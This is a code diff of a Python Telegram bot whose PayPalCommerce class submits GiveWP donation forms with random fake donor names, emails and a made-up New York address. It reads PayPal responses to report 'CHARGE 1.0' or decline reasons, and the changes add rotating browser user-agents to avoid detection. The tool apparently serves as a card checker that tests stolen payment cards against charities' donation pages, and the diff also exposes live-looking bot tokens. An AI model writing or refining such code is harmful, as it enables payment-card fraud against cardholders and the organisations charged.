@@ -19,7 +19,7 @@ from telegram.ext import (
 )
 from datetime import datetime
 
-TOKEN = '7327856614:AAG9fY6rjp_wPKTLNnQCgoZdzagla3h9-80'
+TOKEN = '8031233073:AAGgdXbO9TCxPYdPiedLlT9zGVxIMQFiML4'
 
 ADMINS = [6843321125]
 VIP_USERS = {}
@@ -128,14 +128,32 @@ class PayPalCommerce:
         if urlparse(target_url).query:
             self.inurl += f"?{urlparse(target_url).query}"
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
+        
+        # 6 متصفحات مختلفة
+        self.user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
+        ]
+        self.ua_index = 0
+        
         self._init_and_extract()
         self._get_access_token()
         self._get_client_token()
+    
+    def get_next_ua(self):
+        """يرجع User-Agent التالي بالترتيب"""
+        ua = self.user_agents[self.ua_index % len(self.user_agents)]
+        self.ua_index += 1
+        return ua
 
     def _init_and_extract(self):
         try:
             headers = {
-                'user-agent': self.uu.random,
+                'user-agent': self.get_next_ua(),
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'accept-language': 'en-US,en;q=0.9'
             }
@@ -197,7 +215,7 @@ class PayPalCommerce:
             return None
         try:
             headers = {
-                'user-agent': self.uu.random,
+                'user-agent': self.get_next_ua(),
                 'accept': 'application/json',
                 'content-type': 'application/x-www-form-urlencoded'
             }
@@ -227,7 +245,7 @@ class PayPalCommerce:
             for action in actions:
                 data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                 headers = {
-                    'user-agent': self.uu.random,
+                    'user-agent': self.get_next_ua(),
                     'x-requested-with': 'XMLHttpRequest',
                     'origin': f'https://{self.url}',
                     'referer': f'https://{self.url}{self.inurl}',
@@ -273,9 +291,20 @@ class PayPalCommerce:
             'give_last': random.choice(self.last_name),
             'give_email': self.email,
             'give-gateway': 'paypal-commerce',
+            'give-address1': '123 Main St',
+            'give-address2': '',
+            'give-city': 'New York',
+            'give-state': 'NY',
+            'give-zip': '10001',
+            'give-country': 'US',
+            'give-phone': '2125551234',
+            'give_agree_to_terms': '1',
+            'give_tos_agree': '1',
+            'give_terms_agreement': '1',
+            'give_terms': '1',
         })
         headers = {
-            'user-agent': self.uu.random,
+            'user-agent': self.get_next_ua(),
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'x-requested-with': 'XMLHttpRequest',
             'origin': f'https://{self.url}',
@@ -314,7 +343,7 @@ class PayPalCommerce:
             headers = {
                 'authorization': f'Bearer {self.access_token}',
                 'content-type': 'application/json',
-                'user-agent': self.uu.random,
+                'user-agent': self.get_next_ua(),
                 'accept': 'application/json'
             }
             data = {
@@ -347,9 +376,20 @@ class PayPalCommerce:
             'give_last': random.choice(self.last_name),
             'give_email': self.email,
             'give-gateway': 'paypal-commerce',
+            'give-address1': '123 Main St',
+            'give-address2': '',
+            'give-city': 'New York',
+            'give-state': 'NY',
+            'give-zip': '10001',
+            'give-country': 'US',
+            'give-phone': '2125551234',
+            'give_agree_to_terms': '1',
+            'give_tos_agree': '1',
+            'give_terms_agreement': '1',
+            'give_terms': '1',
         })
         headers = {
-            'user-agent': self.uu.random,
+            'user-agent': self.get_next_ua(),
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'x-requested-with': 'XMLHttpRequest',
             'origin': f'https://{self.url}',
@@ -397,7 +437,7 @@ class PayPalCommerce:
                 he4 = {
                     'authorization': f'Bearer {auth_token}',
                     'paypal-client-metadata-id': self.client_id or '',
-                    'user-agent': self.uu.random
+                    'user-agent': self.get_next_ua()
                 }
                 da3 = {
                     'payment_source': {
@@ -435,6 +475,8 @@ class PayPalCommerce:
                     issue = detail.get('issue', '')
                     description = detail.get('description', '')
                     if issue:
+                        if issue == 'ORDER_NOT_APPROVED':
+                            return "Payer cannot pay for this transaction."
                         if description:
                             return f"{issue}: {description}"
                         return issue
@@ -461,6 +503,8 @@ class PayPalCommerce:
                             issue = detail.get('issue', '')
                             description = detail.get('description', '')
                             if issue:
+                                if issue == 'ORDER_NOT_APPROVED':
+                                    return "Payer cannot pay for this transaction."
                                 if description:
                                     return f"{issue}: {description}"
                                 return issue
@@ -477,6 +521,8 @@ class PayPalCommerce:
                 issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', confirm_text)
                 if issue_matches:
                     issue = issue_matches[0]
+                    if issue == 'ORDER_NOT_APPROVED':
+                        return "Payer cannot pay for this transaction."
                     desc_matches = re.findall(r'"description"\s*:\s*"([^"]+)"', confirm_text)
                     if desc_matches:
                         return f"{issue}: {desc_matches[0]}"
@@ -495,9 +541,17 @@ class PayPalCommerce:
             text = approve_res.text if approve_res else ''
             
             if text:
-                if 'true' in text.lower():
+                text_lower = text.lower()
+                
+                # CHARGE حقيقي
+                if 'true' in text_lower:
                     return 'CHARGE 1.0'
                 
+                # ORDER_NOT_APPROVED → Payer cannot pay
+                if 'order_not_approved' in text_lower:
+                    return "Payer cannot pay for this transaction."
+                
+                # استخراج الرد الفعلي
                 try:
                     approve_json = approve_res.json()
                     if isinstance(approve_json, dict):
@@ -512,6 +566,8 @@ class PayPalCommerce:
                                         issue = detail.get('issue', '')
                                         description = detail.get('description', '')
                                         if issue:
+                                            if issue == 'ORDER_NOT_APPROVED':
+                                                return "Payer cannot pay for this transaction."
                                             if description:
                                                 return f"{issue}: {description}"
                                             return issue
@@ -520,7 +576,10 @@ class PayPalCommerce:
                 
                 issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', text)
                 if issue_matches:
-                    return issue_matches[0]
+                    issue = issue_matches[0]
+                    if issue == 'ORDER_NOT_APPROVED':
+                        return "Payer cannot pay for this transaction."
+                    return issue
                 
                 name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', text)
                 if name_matches:
